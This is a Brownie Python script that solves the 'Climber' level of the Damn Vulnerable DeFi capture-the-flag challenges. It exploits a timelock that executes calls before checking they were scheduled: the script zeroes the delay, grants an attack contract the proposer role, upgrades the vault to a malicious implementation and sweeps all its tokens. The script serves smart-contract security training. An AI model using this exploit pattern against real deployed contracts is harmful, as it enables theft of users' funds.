from brownie import *
import contextlib


def main():
    deployer = a[0]

    VAULT_TOKEN_BALANCE = Wei('10000000 ether')

    with contextlib.redirect_stdout(None):
        attacker = accounts.add()
        proposer = accounts.add()
        sweeper = accounts.add()

    deployer.transfer(attacker, '0.1 ether')

    logic = ClimberVault.deploy({'from': deployer})
    data = logic.initialize.encode_input(deployer, proposer, sweeper)
    proxy = ERC1967Proxy.deploy(logic, data, {'from': deployer})
    vault = Contract.from_abi("ClimberVaultProxy", proxy, ClimberVault.abi)

    assert vault.getSweeper() == sweeper.address
    assert vault.getLastWithdrawalTimestamp() > 0
    assert vault.owner() != ZERO_ADDRESS
    assert vault.owner() != deployer.address

    timelock = ClimberTimelock.at(vault.owner())

    assert timelock.hasRole(timelock.PROPOSER_ROLE(), proposer)
    assert timelock.hasRole(timelock.ADMIN_ROLE(), deployer)

    token = DamnValuableToken.deploy({'from': deployer})
    token.transfer(vault, VAULT_TOKEN_BALANCE)

    # Exploit code here
    # attack contract gains proposer role
    attack = TimelockAttack.deploy({'from': attacker})
    targets = [timelock, timelock, attack]
    values = [0, 0, 0]
    salt = 0
    data = []
    data.append(timelock.updateDelay.encode_input(0))
    data.append(
        timelock.grantRole.encode_input(timelock.PROPOSER_ROLE(), attack))
    data.append(attack.becomeProposer.encode_input(timelock))
    timelock.execute(targets, values, data, salt, {'from': attacker})
    # upgrade the contract and sweep the funds
    evilVault = EvilVault.deploy({'from': attacker})
    attack.upgrade(timelock, vault, evilVault, {'from': attacker})
    vault.sweepFunds(token, {'from': attacker})

    # Success conditions
    print('Challenge successfully passed.')
    assert token.balanceOf(vault) == 0
    assert token.balanceOf(attacker) == VAULT_TOKEN_BALANCE

